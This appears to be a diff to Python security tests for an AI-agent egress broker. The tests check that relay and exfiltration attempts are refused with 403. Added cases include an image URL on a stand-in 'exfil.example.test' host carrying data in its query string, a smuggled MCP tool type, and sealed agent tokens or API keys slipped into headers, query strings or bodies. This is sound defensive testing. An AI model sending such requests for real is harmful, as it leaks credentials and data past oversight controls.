@@ -9,6 +9,9 @@ FAKE = {"id": "fake", "hosts": ["model.example.test"],
         "fields": ["model", "messages", "tools", "stream"], "toolTypes": ["function"]}
 CRED = {"id": "fake-model", "inject": {"header": "Authorization", "fmt": "Bearer {value}"},
         "bind": [{"host": "model.example.test", "path": "/v1/**", "methods": ["GET", "POST"]}]}
+# An agent-host token sealed to an advertised key (inert marker, not a real token format).
+SEALED = "copilot-sealed.v1.AAAA"
+SEALED_AUTH = "Authorization: Bearer " + SEALED
 
 
 def setup(pod, ctl, budget=None):
@@ -60,6 +63,10 @@ def test_a22_relay_shapes_denied_before_upstream(pod, ctl):
         pod.curl("https://model.example.test/v1/models", "-H", f"Authorization: Bearer {s}",
                  "-H", "Connection: Upgrade", "-H", "Upgrade: websocket", "-H", "Sec-WebSocket-Version: 13",
                  "-H", "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=="),
+        # Review round 7: content the provider would fetch is a relay without any tool.
+        post(pod, s, {"model": "m", "messages": [{"role": "user", "content": [
+            {"type": "image_url", "image_url": {"url": "https://exfil.example.test/c.png?d=x"}}]}]}),
+        post(pod, s, '{"model":"m","tools":[{"type":"function","Type":"mcp"}]}', raw=True),
     ]
     assert [c.code for c in cases] == [403] * len(cases), [c.body for c in cases]
     denied = [e for e in ctl.notes_since(mark, "audit.event") if e["type"] == "model.denied"]
@@ -71,12 +78,21 @@ def test_model_host_credentials_are_sentinels_only(pod, ctl):
     setup(pod, ctl)
     r = post(pod, "tab-held-key-" + "Z" * 32, {"model": "m", "messages": []})
     assert r.code == 403 and "sentinel" in r.body
+    # Review round 7: a tab-held key in another header or the query string.
+    for extra in (["-H", "x-goog-api-key: tab-held-key-ZZZZ"], []):
+        url = "https://model.example.test/v1/models" + ("" if extra else "?key=tab-held-key-ZZZZ")
+        r = pod.curl(url, *extra)
+        assert r.code == 403 and "sentinel" in r.body
     # A25 (broker side): a token sealed for the agent host is never forwarded anywhere.
     pod.load({"allow": [{"host": "model.example.test"}, {"host": "api.example.test"}],
               "models": {"providers": [FAKE]}, "prompt": {"enabled": False}})
     for host in ("model.example.test", "api.example.test"):
-        r = pod.curl(f"https://{host}/v1/models", "-H", "Authorization: Bearer copilot-sealed.v1.AAAA")
+        r = pod.curl(f"https://{host}/v1/models", "-H", SEALED_AUTH)
         assert r.code == 403 and "sealed" in r.body
+    r = pod.curl("https://api.example.test/echo/x?t=" + SEALED)
+    assert r.code == 403 and "sealed" in r.body
+    r = pod.curl("https://api.example.test/echo/x", "-X", "POST", "--data-binary", SEALED)
+    assert r.code == 403 and "sealed" in r.body
 
 
 def test_body_policy_applies_only_to_model_hosts(pod, ctl):
